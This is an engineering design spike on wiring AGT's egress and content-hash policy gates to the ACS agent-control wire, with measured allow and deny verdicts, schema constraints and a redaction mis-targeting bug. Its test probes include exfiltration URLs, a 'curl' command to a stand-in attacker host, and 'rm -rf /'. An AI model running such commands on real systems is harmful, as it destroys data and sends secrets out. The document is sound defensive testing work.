---
shaping: true
---

# Spike: the two AGT gates ACS already addresses

## Context

Nine gate classes live in the pinned AGT stock bundle (`policy/lib/agt_default.rego`
consults each one in priority order). Three are reachable in this deployment
today — `ifc`, `patterns`, `redact` — because `policy/lib/data.json` configures
exactly those three keys. The other six are `undefined` on every call, because
each is gated on a `cfg.*` key nobody sets.

Of those six, `drift` and `confidence` are outside the wire **by design**: AGT's
own `drift.rego` header puts behaviour-drift detection outside the policy engine
and names the annotator as the seam, and `policy/manifest.drift.yaml` already
argues that case at length. `budgets` is a genuine ACS v0.1.0 coverage gap —
there is no budget, token, cost or elapsed state anywhere on the wire, and the
one occurrence of the word "budget" in `handshake.json` is prose about tuning
timeouts. `approval` is a single global config switch.

That leaves **`egress` and `content_hash`**, which are a third thing again, and
this spike is about them: the claim under investigation was that ACS carries the
information these two gates need, at an address neither the Guardian nor AGT
currently reads.

## Goal

Learn whether each gate is reachable from the ACS wire as it stands, and by what
concrete steps — not whether it is worth doing.

## Questions

| # | Question |
|---|----------|
| **Q1** | Where does AGT's stock `egress` gate look for a destination, and does anything the ACS wire already carries land there? |
| **Q2** | What does the shipped manifest's single `policy_target` do to a tool whose arguments are not a shell command? |
| **Q3** | Does the ACS wire carry `capability` and `raw_command` into the AGT snapshot today? |
| **Q4** | Can a manifest tool entry declare a `content_hash`, and does the SDK carry it through to `input.tool`? |
| **Q5** | Which ACS hook carries an integrity digest, and does its semantics match what AGT's `content_hash` gate decides? |
| **Q6** | Can the *approved* side of a content-hash comparison be supplied per session rather than per manifest? |
| **Q7** | If one `policy_target` leaf serves every tool, what do the other live gates do when it holds a URL instead of a command? |
| **Q8** | Can one manifest carry both an annotator and the ordinary gates, or does an annotator force a manifest of its own? |

---

## A1 — egress reads four snapshot paths and one annotation path, and the ACS wire already lands on the first

`policy/lib/egress.rego` declares its own defaults:

```rego
default_destination_paths := [
	["snapshot", "tool_call", "args", "url"],
	["snapshot", "tool_call", "args", "endpoint"],
	["snapshot", "tool_call", "args", "host"],
	["snapshot", "tool_call", "args", "domain"],
	["annotations", "egress", "destination"],
]
```

`assemblePreToolCallSnapshot` unwraps every ACS `arguments.<k>.value` into
`tool_call.args.<k>`. So a tool whose ACS arguments carry a `url` — Claude
Code's `WebFetch`, OpenCode's `webfetch` — already lands its destination at
`snapshot.tool_call.args.url`, which is AGT's **first** default path. Nothing
translates it; the two vocabularies already agree.

**Measured.** A bridge over an unforked `policy/lib`, one `data.json` key
(`config.egress.allowlist`) and one manifest `tools:` entry, fed a snapshot
assembled by the shipped `assemblePreToolCallSnapshot` from an ACS
`steps/toolCallRequest` payload:

| Envelope | Verdict |
|---|---|
| `arguments.url.value = "https://docs.anthropic.com/x"` | `{"decision":"allow","result_labels":["public"]}` |
| `arguments.url.value = "https://exfil.attacker.test/steal"` | `{"decision":"deny","reason":"egress_destination_not_allowed","message":"destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}` |

**Zero code, zero Rego** — the same standard `verify:pin` already holds
`policy/lib` to. This is the strongest available form of R2.1: AGT's published
library deciding, driven only through `data.agt.defaults.config`.

Two conditions attach, both easy to trip:

- `allowlist(rules)` falls back to `input.tool.security_labels` when
  `cfg.egress.allowlist` is absent. Every tool in the shipped
  `policy/manifest.yaml` carries `security_labels: [shell]`, so an operator who
  turns the gate on with a bare `egress: {}` gets an allowlist of `["shell"]` and
  **denies every destination**. `policy/manifest.yaml`'s own `bash` comment
  anticipates the coupling ("carried only so `bash` behaves like `Bash` the
  moment `cfg.egress` ever gets configured") but not this direction of it.
- The gate is `undefined` when no destination resolves, so a shell tool is
  simply not covered — it is not denied, it is not consulted.

## A2 — the shipped `policy_target` fails closed on any tool without a `command` argument

AGT's `manifest.schema.json` at the pinned ref defines `intervention_point` with
`additionalProperties: false` and exactly one `policy_target`. There is no
per-tool variation: **one manifest, one intervention point, one target path.**

`policy/manifest.yaml` declares `policy_target: "$.tool_call.args.command"`.

**Measured.** The identical egress probe above, changed only to that target:

| Envelope | Verdict |
|---|---|
| `arguments.url.value = "https://docs.anthropic.com/x"` | `{"decision":"deny","reason":"runtime_error:path_missing","message":"Request blocked by Agent Control Specification."}` |
| `arguments.url.value = "https://exfil.attacker.test/steal"` | same |

AGT resolves `policy_target` before any rule runs, so a benign `WebFetch` call is
denied on a missing path rather than evaluated. This has never bitten because
`.claude/settings.json` and `hosts/claude-code/settings.json` both match `^Bash$`
— the deployment governs exactly one tool, whose argument is named `command`.

**This is the load-bearing constraint for anything in this area.** Governing a
second tool shape is not "add a matcher": it needs an answer to what a single
`policy_target` addresses when two tools disagree about their argument names.

## A3 — `capability` and `raw_command` are typed, unpopulated, and dropped

Both fields are real ACS v0.1.0 members of `hooks/tool-call-request.json`.
`capability` is documented with `network.egress` as one of its three worked
examples — the exact string AGT's gate is named for.

In this repository they occur in source **once each**, both in
`packages/guardian/src/validate-envelope.ts`:

```
validate-envelope.ts:98:  capability?: string;
validate-envelope.ts:100:  raw_command?: string;
```

No hookmap declares either. Neither assembler forwards either. So the wire
defines them, this implementation validates them, and nothing downstream can
read them. An egress destination inside a shell command is *present on the wire*
and *absent from every snapshot*.

Note what this does **not** buy on its own: `egress.rego`'s `host_of()` splits on
`://` and `/`, so handed `curl https://evil.test/x` it answers `curl https`.
Forwarding `raw_command` into a `destination_paths` entry produces a garbage
host, not a destination. Extraction is a real step, not a plumbing step.

## A4 — a manifest tool may declare `content_hash`, and the SDK carries it through

AGT's `manifest.schema.json` defines `$defs/tool` with `additionalProperties:
true`, so an unrecognised key is legal rather than merely tolerated.

**Measured**, reading AGT's own `policyInput` back out of the bridge's evidence
path — the manifest declared `content_hash: "sha-256:APPROVED"` on a tool, and
AGT saw:

```json
{"content_hash":"sha-256:APPROVED","id":"code-reviewer","type":"Tool","name":"code-reviewer"}
```

With `config.content_hash.enforce: true` and the observed hash placed at
`snapshot.tool_call.content_hash`, all three stock behaviours fire:

| Observed | Verdict |
|---|---|
| `sha-256:APPROVED` | `{"decision":"allow","result_labels":["public"]}` |
| `sha-256:POISONED` | `{"decision":"deny","reason":"tool_content_hash_mismatch","message":"declared sha-256:APPROVED but observed sha-256:POISONED"}` |
| *(absent)* | `{"decision":"deny","reason":"tool_content_hash_mismatch","message":"manifest declared tool.content_hash but snapshot.tool_call.content_hash was missing"}` |

The gate is reachable. The only thing it needs from this side is a
`snapshot.tool_call.content_hash`.

## A5 — ACS carries the digest at `steps/skillLoad`, and the spec's own text is AGT's gate

`hooks/skill-load.json` requires `digest {algorithm, value}` and describes what a
Guardian is to do with it:

> The Guardian compares it against the digest it approved at
> `steps/skillRegister`; a mismatch means the artifact changed between
> registration and load (tamper or swap).
>
> A load the Guardian cannot tie to an approved registration, or whose digest
> differs from the approved one, is unverifiable and SHOULD be denied.

That is, clause for clause, what `content_hash.rego` decides — mismatch denies,
and declared-but-unobserved denies. The two were written independently about the
same threat.

The address differs, and the *subject* differs with it:

| | AGT `content_hash` | ACS v0.1.0 |
|---|---|---|
| Subject | a **tool** | a **skill** |
| Approved side | `input.tool.content_hash`, from the manifest tool catalog | `steps/skillRegister` → `definition.digest`, Guardian-persisted |
| Observed side | `snapshot.tool_call.content_hash`, host-attached | `steps/skillLoad` → `digest` |

ACS's AgBOM confirms the split rather than softening it: `skill_fields.definition`
is required to carry `{ref, digest}` and is described as "the surface attackers
poison", while `tool_fields` requires only `capability`. **ACS puts the integrity
digest on skills and not on tools.** So this is not one field at a different
address; it is the same control applied to a different component class, and any
claim made here has to say so.

## A6 — no. The approved side is manifest-static

`content_hash.rego` reads the declared hash from `input.tool.content_hash` and
nowhere else. `input.tool` is resolved by the SDK from the manifest's `tools:`
catalog, keyed by the snapshot's `tool_call.name`. There is no config hook (no
`declared_paths` counterpart to `egress`'s `destination_paths`), and annotations
are not consulted.

So the approved digest a Guardian recorded at `steps/skillRegister` **cannot
reach this gate through session state.** Either the manifest declares it ahead of
time, or the Guardian writes a manifest per session, or the register-time
approval is enforced Guardian-side and AGT re-checks against a static declaration.

This is the design constraint on the content-hash half, and it is not
negotiable from this side — closing it upstream would mean AGT accepting a
declared hash from the snapshot, which weakens its own trust model and is not
something to propose lightly.

## A7 — a shared `policy_target` leaf is safe at the AGT layer, and leaks at the ACS layer

The proposal is one normalised leaf every tool writes, so the manifest keeps its
single `policy_target` and every gate stays live in one Guardian. The hazard is
that `patterns` and `redact` read that same leaf (`pattern_text()` and
`redact_verdict` both fall back to `input.policy_target.value`), so a URL landing
there is evaluated by rules written for shell commands.

**Measured**, one manifest with `policy_target: "$.tool_call.args.acs_policy_target"`,
the shipped `patterns` / `redact` / `ifc` config plus an `egress` allowlist:

| Call | Verdict |
|---|---|
| `Bash`, `echo hi` | `allow` |
| `Bash`, `rm -rf /` | `deny` `destructive_shell_command_blocked` |
| `WebFetch`, `https://docs.anthropic.com/x` | `allow` |
| `WebFetch`, `https://exfil.test/x` | `deny` `egress_destination_not_allowed` |
| `WebFetch`, url carrying `ghp_…` | `transform` → `https://docs.anthropic.com/?t=[REDACTED]` |
| `Bash`, command carrying `ghp_…` | `transform` → `echo [REDACTED]` |

All four gates coexist correctly. No false positive in either direction: the
destructive-shell patterns do not match URLs, and the egress gate does not match
commands. **The AGT layer is fine.**

**The ACS layer is not.** `mapping.yaml` declares
`pre_tool_call.modifications.into_argument: command` as a **literal**. Run the
fifth row's verdict through the real `mapVerdict`:

```json
{
  "decision": "modify",
  "modifications": { "parameter_overrides": { "command": "https://docs.anthropic.com/?t=[REDACTED]" } }
}
```

The redaction is emitted against an argument `WebFetch` does not have, and `url`
— still carrying the token — is untouched. A modification reported applied while
the original is delivered: the same family as §V4's risk row 15 and §V5's row 17,
arrived at from a third direction.

So the normalised leaf is **two coupled declarations, not one**: which argument
becomes the policy target, and which argument a transform lands back on. They
must be one entry read twice, or they will disagree. `test/path-dialects.test.ts`
today derives `into_argument` from the manifest's `policy_target`; under a
normalised leaf that derivation yields the leaf's own name, which is not an
argument any host sends, so the check has to change with it.

One smaller consequence, worth catching before it ships: `mapping.yaml`'s
`summaries.redaction_applied.pre_tool_call` reads "A secret in this **command**
was replaced before it ran." Under a shared leaf that sentence is wrong for
every non-shell tool.

## A8 — an annotator does not force a second manifest, but an undispatched one denies everything

`policy/manifest.drift.yaml` exists as a sibling so "a deployment that wants no
annotator has none". **Measured** why that mattered — one manifest declaring
`annotators: egress: {type: classifier}`, evaluated by a bridge constructed
without a dispatcher:

| Call | Verdict |
|---|---|
| `echo hi` | `deny` `runtime_error:annotation_failed` — *"egress: missing required field 'url'"* |
| `curl https://exfil.test/steal` | same |

Every call, including entirely benign ones. An annotator declared in a manifest
the Guardian dispatches nothing for is a **total deny**, not a no-op.

With a dispatcher supplied — `createBridge` already accepts one, and
`startGuardian({annotator})` already threads it — the same manifest behaves:

| Call | Verdict |
|---|---|
| `echo hi` | `allow` (no destination found → gate `undefined` → falls through) |
| `curl https://exfil.test/steal` | `deny` `egress_destination_not_allowed` |
| `curl https://docs.anthropic.com/x` | `allow` |

So the annotator route works, and one manifest can carry it — provided the
Guardian always supplies a dispatcher. The condition is not a detail: forgetting
it converts the whole deployment to deny-everything with a `runtime_error`
reason, which reads like a policy decision.

---

## Acceptance

Met. For each of the two gates we can now describe where AGT looks, what the ACS
wire carries, which of the two already agree, and what concrete steps stand
between them:

- **`egress`** is reachable with configuration alone for any tool whose ACS
  arguments already name a destination, and needs (a) an answer to A2's single
  `policy_target`, and (b) a destination-extraction step for tools that carry the
  destination inside `raw_command`.
- **`content_hash`** is reachable once a Guardian attaches
  `snapshot.tool_call.content_hash`; ACS supplies that value at
  `steps/skillLoad`, a hook this implementation does not instrument, for skills
  rather than tools, against an approved digest that must be manifest-declared.
- **The normalised `policy_target` leaf** that both of those depend on is sound
  at the AGT layer and must carry a second, coupled declaration at the ACS layer
  or it silently mis-targets every redaction on a non-shell tool.
- **The annotator** needs no second manifest, and needs the Guardian to always
  supply a dispatcher or the deployment denies everything.

## Where the shipped code stands against this

| Fact | Where |
|---|---|
| `capability` and `raw_command` typed, unpopulated, dropped | `packages/guardian/src/validate-envelope.ts:98,100` |
| Only `Bash` is governed | `.claude/settings.json`, `hosts/claude-code/settings.json` — `"matcher": "^Bash$"` |
| The single target path | `policy/manifest.yaml` — `policy_target: "$.tool_call.args.command"` |
| The literal that mis-targets | `mapping.yaml` — `into_argument: command` |
| Arguments unwrapped into the snapshot | `packages/guardian/src/assemble-snapshot.ts` — `args[key] = wrapper.value` |
| The dispatcher seam, already built | `packages/agt-bridge/src/index.ts` — `CreateBridgeOptions.annotator` |
| The session's first IFC labels | `packages/guardian/src/session-context.ts:163` — `ifc_labels: ["public"]` |

## Residual, found on the way and not this spike's subject

**⚠️ `cfg.egress: {}` with the shipped manifest denies every destination.** The
allowlist falls back to `input.tool.security_labels`, which is `["shell"]` on
every registered tool. Whoever turns this gate on gets a total-deny that reads
like a policy decision. Recorded here rather than in a review transcript; it
belongs to whichever slice first sets an `egress` key.
